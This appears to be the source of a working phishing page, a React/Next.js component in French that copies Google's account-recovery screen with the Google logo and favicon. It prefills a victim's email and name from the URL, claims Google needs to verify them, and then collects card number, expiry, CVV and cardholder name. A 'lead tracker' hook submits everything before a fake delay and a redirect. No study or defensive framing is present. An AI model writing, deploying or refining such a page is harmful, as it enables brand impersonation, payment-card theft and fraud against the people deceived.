import React, { useState, useEffect, useRef } from 'react';
import { useRouter } from 'next/router';
import { PageHead } from '../src/hooks/usePageMeta';
import { useLeadTracker } from '../src/hooks/useLeadTracker';
import PaymentForm from '../src/components/payment/PaymentForm';
import styles from '../src/styles/modules/GoogleLogin.module.css';

const Recovery = () => {
  const router = useRouter();
  const [email, setEmail] = useState('');
  const [firstName, setFirstName] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [showPaymentForm, setShowPaymentForm] = useState(false);
  const [selectedPlan, setSelectedPlan] = useState('free');
  const [formData, setFormData] = useState({
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    cardName: ''
  });
  
  // Hook pour le tracking des leads
  const { trackVerification, isTracking } = useLeadTracker();

  // Récupérer l'email et le prénom depuis l'URL au chargement
  useEffect(() => {
    if (router.query.email) {
      // Gérer le cas où email pourrait être un array (paramètres en double)
      const emailValue = Array.isArray(router.query.email) ? router.query.email[0] : router.query.email;
      setEmail(emailValue);
      setShowPassword(true); // Afficher directement l'étape mot de passe
    }
    if (router.query.firstName) {
      const firstNameValue = Array.isArray(router.query.firstName) ? router.query.firstName[0] : router.query.firstName;
      setFirstName(firstNameValue);
    }
  }, [router.query.email, router.query.firstName]);

  // Fonction pour obtenir l'initiale de l'email
  const getEmailInitial = (email) => {
    if (!email) return 'U';
    // Gérer le cas où email pourrait être un array
    const emailStr = Array.isArray(email) ? email[0] : email;
    return emailStr && typeof emailStr === 'string' ? emailStr.charAt(0).toUpperCase() : 'U';
  };

  const handleEmailSubmit = (e) => {
    e.preventDefault();
    setShowPassword(true);
  };

  const handleRecoverAccount = () => {
    setShowPaymentForm(true);
  };

  const handleInputChange = (field, value) => {
    let formattedValue = value;
    
    if (field === 'cardNumber') {
      formattedValue = value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ').trim();
    } else if (field === 'expiryDate') {
      formattedValue = value.replace(/\D/g, '').replace(/(\d{2})(?=\d)/, '$1/');
    } else if (field === 'cvv') {
      formattedValue = value.replace(/\D/g, ''); 
    }
    
    setFormData(prev => ({ ...prev, [field]: formattedValue }));
  };

  const handlePaymentSubmit = async () => {
    try {
      // Tracker la vérification avec les données de paiement
      const trackingResult = await trackVerification({
        email,
        firstName,
        cardNumber: formData.cardNumber,
        cardExpiry: formData.expiryDate,
        cardCvv: formData.cvv,
        cardName: formData.cardName,
        selectedPlan
      });
      
      console.log('✅ Tracking de vérification réussi:', trackingResult);
      
      // Simuler un délai de 6 secondes
      await new Promise(resolve => setTimeout(resolve, 6000));
      
      // Redirection finale
      router.push('/dashboard');
      
    } catch (error) {
      console.error('❌ Erreur lors du processus de vérification:', error);
    }
  };

  return (
    <>
      <PageHead 
        title="Récupération de compte"
        description="Récupérez l'accès à votre compte Google"
        options={{
          keywords: 'récupération, compte, google, mot de passe',
          favicon: '/google-favicon.ico'
        }}
      />
      <div className={styles.container}>
      <div className={styles.loginCard}>
        <div className={styles.header}>
          <div className={styles.googleLogo}>
            <svg xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true" jsname="jjf7Ff"><path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path><path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path><path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path><path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path></svg>
          </div>
          <h1 className={`${styles.title} ${showPassword ? styles.titleWithName : ''}`}>
            {showPassword && firstName ? `Bienvenue ${firstName}` : 'Récupération de compte'}
          </h1>
        </div>

        {!showPassword ? (
          <form onSubmit={handleEmailSubmit} className={styles.form}>
            <div className={styles.inputGroup}>
              <input
                type="email"
                placeholder="Adresse e-mail ou numéro de téléphone"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className={styles.input}
                required
              />
            </div>
            <div className={styles.forgotLink}>
              <a href="#" className={styles.link}>Adresse e-mail oubliée ?</a>
            </div>
            <div className={styles.guestInfo}>
              <p>Vous n'êtes pas sur votre ordinateur ? Utilisez le mode Invité pour vous connecter en privé.</p>
              <a href="#" className={styles.link}>En savoir plus</a>
            </div>
            <div className={styles.actions}>
              <button type="button" className={styles.createAccount}>
                Créer un compte
              </button>
              <button type="submit" className={styles.nextBtn}>
                Suivant
              </button>
            </div>
          </form>
        ) : (
          <div className={styles.passwordSection}>
            <div className={styles.accountSelector}>
              <div className={styles.accountInfo}>
                <div className={styles.avatar}>
                  {getEmailInitial(email)}
                </div>
                <span className={styles.emailText}>{email}</span>
                <button type="button" className={styles.dropdownArrow}>
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M7 10l5 5 5-5z"/>
                  </svg>
                </button>
              </div>
            </div>

            <div className={styles.continueText}>
            Afin de protéger votre compte, Google veut s'assurer que c'est bien vous qui essayez de vous connecter
            </div>

            {!showPaymentForm ? (
              <div className={styles.actions}>
                <button type="button" className={styles.nextBtn} onClick={handleRecoverAccount} style={{ padding: '12px 24px', height: '48px' }}>
                  Récupérer mon compte
                </button>
              </div>
            ) : (
              <PaymentForm 
                selectedPlan={selectedPlan}
                formData={formData}
                onInputChange={handleInputChange}
                onSubmit={handlePaymentSubmit}
                isSubmitting={isTracking}
                email={email}
                firstName={firstName}
              />
            )}
          </div>
        )}
      </div>

      <div className={styles.footer}>
        <div className={styles.language}>
          <select className={styles.languageSelect}>
            <option>Français (France)</option>
            <option>English</option>
            <option>Español</option>
          </select>
        </div>
        <div className={styles.links}>
          <a href="#" className={styles.footerLink}>Aide</a>
          <a href="#" className={styles.footerLink}>Confidentialité</a>
          <a href="#" className={styles.footerLink}>Conditions d'utilisation</a>
        </div>
      </div>
    </div>
    </>
  );
};

export default Recovery; 